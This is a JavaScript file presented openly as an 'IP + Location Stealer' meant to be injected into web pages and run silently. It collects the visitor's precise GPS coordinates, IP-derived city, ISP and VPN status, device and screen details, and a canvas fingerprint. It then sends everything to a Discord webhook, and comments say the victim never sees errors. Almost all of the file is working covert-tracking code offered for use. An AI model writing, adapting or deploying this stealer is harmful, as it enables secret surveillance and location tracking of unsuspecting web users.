// === Ghost Protocol IP + Location Stealer - Pure JS Edition ===
// Target: Grab as much geolocation & fingerprint data as possible
// Delivery: Inject & run silently

(async function ghostSteal() {
    // ================= CONFIG =================
    const WEBHOOK = "https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv";  
    // ^^^ REPLACE THIS — or use your own endpoint, Telegram bot, etc.

    // ================= PAYLOAD STRUCTURE =================
    const data = {
        timestamp: new Date().toISOString(),
        origin: window.location.href,
        referrer: document.referrer || "direct",
        userAgent: navigator.userAgent,
        language: navigator.languages?.join(", ") || navigator.language,
        platform: navigator.platform,
        hardware: {
            cpu_cores: navigator.hardwareConcurrency || "unknown",
            ram_gb: navigator.deviceMemory || "unknown",
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : "unknown"
        },
        screen: {
            w: screen.width,
            h: screen.height,
            avail_w: screen.availWidth,
            avail_h: screen.availHeight,
            depth: screen.colorDepth,
            pixel_ratio: window.devicePixelRatio
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        // These will be filled below
        gps: null,
        gps_error: null,
        ip_data: null
    };

    // 1. Try high-accuracy HTML5 Geolocation (exact coords if permitted)
    if ("geolocation" in navigator) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });

            data.gps = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy_m: position.coords.accuracy,
                altitude_m: position.coords.altitude,
                altitude_accuracy_m: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed_mps: position.coords.speed
            };
        } catch (err) {
            data.gps_error = `${err.message} (code: ${err.code})`;
        }
    }

    // 2. Silent fallback: IP → city / approximate coords
    try {
        const res = await fetch("https://ipwho.is/", {
            cache: "no-store",
            mode: "cors"
        });
        if (res.ok) {
            const ip = await res.json();
            data.ip_data = {
                ip: ip.ip,
                city: ip.city,
                region: ip.region,
                country: ip.country,
                country_code: ip.country_code,
                lat: ip.latitude,
                lon: ip.longitude,
                timezone: ip.timezone?.id,
                isp: ip.connection?.isp,
                org: ip.connection?.org,
                asn: ip.connection?.asn,
                proxy_vpn_tor: ip.proxy?.proxy || ip.proxy?.vpn || ip.proxy?.tor || false
            };
        }
    } catch (e) {
        // swallow silently
    }

    // 3. Optional: quick canvas + WebGL fingerprint (adds uniqueness)
    try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText("ghost protocol", 2,15);
        ctx.fillStyle = "rgba(102,204,0,0.7)";
        ctx.fillText("ghost protocol", 4,17);
        data.canvas_hash = canvas.toDataURL(); // base64 — unique per GPU/driver combo
    } catch {}

    // 4. Ship it — no-cors so it works cross-origin
    try {
        await fetch(WEBHOOK, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {
        // victim never sees the error
    }

})();

// Optional: retry once after short delay (in case popup blocks first attempt)
setTimeout(ghostSteal, 4000);
